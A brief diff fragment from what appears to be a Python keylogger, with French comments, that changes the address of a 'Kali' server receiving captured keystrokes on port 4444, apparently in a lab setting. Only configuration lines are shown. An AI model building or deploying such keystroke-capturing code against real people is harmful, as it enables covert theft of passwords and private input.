@@ -6,7 +6,7 @@ import socket as s
 import os
 
 # Adresse et port du serveur (Kali)
-SERVER_IP = "192.168.196.1"
+SERVER_IP = "192.168.206.1"
 SERVER_PORT = 4444
 
 # Fichier pour sauvegarder les frappes
